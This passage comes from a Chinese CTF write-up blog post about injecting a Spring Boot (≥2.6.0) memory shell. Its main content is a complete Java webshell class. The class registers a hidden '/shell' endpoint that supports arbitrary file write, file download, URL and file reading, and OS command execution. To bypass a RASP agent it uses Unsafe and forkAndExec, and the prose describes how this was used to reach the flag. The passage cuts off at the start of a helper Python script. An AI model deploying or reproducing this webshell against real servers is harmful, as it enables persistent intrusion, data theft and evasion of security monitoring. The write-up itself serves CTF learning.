class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (aClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                field = aClass.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                aClass = aClass.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>第一次自己写内存马用，当时也是出了很多问题，不过后来也是跟着文章搞好了</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://landgrey.me/blog/12/" >LandGrey’s Blog<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html" >Spring内存马学习 | Bmth’s blog<i class="fas fa-external-link-alt"></i></a></p>
+<p>跟着这两篇文章写好了，主要是SpringBoot以2.6.0为分界，Controller的注册方法有点不一样。成功以后自己再去加各种功能就很方便了，这里展示的是最完整的内存马：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.http.fileupload.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Memshell when SpringBoot&gt;=2.6.0</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringBootController_Higher2_6_0</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;start static SpringBootController_Higher2_6_0&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">declaredMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;memshell.SpringBootController_Higher2_6_0&quot;</span>).getDeclaredMethod(<span class="string">&quot;login&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>).options(config).build();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, Class.forName(<span class="string">&quot;memshell.SpringBootController_Higher2_6_0&quot;</span>).newInstance(), declaredMethod);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;SpringBootController_Higher2_6_0 is been registered&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException |</span><br><span class="line">                 NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SpringBootController_Higher2_6_0</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpringBootController_Higher2_6_0 no args constructor is been used&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//任意文件写入</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">writePath</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;writePath&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">writeBytes</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;writeBase64&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (writePath != <span class="literal">null</span> &amp;&amp; writeBytes != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] decode = Base64.getDecoder().decode(writeBytes);</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(writePath).write(decode);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//文件下载</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (filePath != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">                writer.write(s);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//读文件，不会触发Runtime等</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">urlContent</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">read</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (read != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(read);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(url.openStream()));</span><br><span class="line">                <span class="type">String</span> <span class="variable">inputLine</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    urlContent = urlContent + inputLine + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                in.close();</span><br><span class="line">                writer.println(urlContent);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line"><span class="comment">//            命令执行ProcessImpl</span></span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String[] strs = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="comment">//通过forkAndExec命令执行</span></span><br><span class="line">            <span class="keyword">if</span> (strs != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">                theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span></span><br><span class="line">                <span class="comment">// memory management in Java than in C.</span></span><br><span class="line">                <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[strs.length - <span class="number">1</span>][];</span><br><span class="line">                <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">                    args[i] = strs[i + <span class="number">1</span>].getBytes();</span><br><span class="line">                    size += args[i].length;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">                    System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">                    i += arg.length + <span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// No need to write NUL bytes explicitly</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span>[] envc = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span>[] std_fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">helperpathField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">                launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(processObject);</span><br><span class="line">                <span class="type">byte</span>[] helperpathObject = (<span class="type">byte</span>[]) helperpathField.get(processObject);</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"></span><br><span class="line">                <span class="type">Method</span> <span class="variable">forkMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class,</span><br><span class="line">                        <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                forkMethod.setAccessible(<span class="literal">true</span>);<span class="comment">// 设置访问权限</span></span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkMethod.invoke(processObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        ordinal + <span class="number">1</span>, helperpathObject, toCString(strs[<span class="number">0</span>]), argBlock, args.length,</span><br><span class="line">                        <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">                initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">                getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line"></span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                writer.write(baos.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toCString(String s) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes  = s.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(bytes, <span class="number">0</span>,</span><br><span class="line">                result, <span class="number">0</span>,</span><br><span class="line">                bytes.length);</span><br><span class="line">        result[result.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一开始其实注入的就是一个最普通的内存马，后来发现没法执行命令。于是增加了目录和文件读取的功能，通过read&#x3D;file:&#x2F;&#x2F;&#x2F;这样的伪协议形式读。然后会发现虽然能知道flag就在根目录下，但是由于权限原因没法直接读取（看dockerfile知道的）。查看app目录，发现有jrasp.jar，再给内存马加功能，把rasp下载下来（读base64编码，python脚本再转换）。</p>
+<p>rasp没学的话可以参考文末的几篇文章。这个rasp禁止了ProcessImpl，但是没禁止UnixProcess，所以我们可以直接通过UnixProcess去执行命令。但是我内存马是直接用forkAndExec去执行了，更底层一点。虽然作者的本意是让我们写JNI文件去命令执行的。</p>
+<p>这样注入后就可以执行命令了，通过readFlag去读。但是这个readFlag是一个算术题，也是需要把文件下载，然后写对应的C语言程序与readFlag交互，最后把写好的C语言程序上传并执行。这个计算题的步骤我当时没复现，感觉有点麻烦。</p>
+<p>最后给一下参考的python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 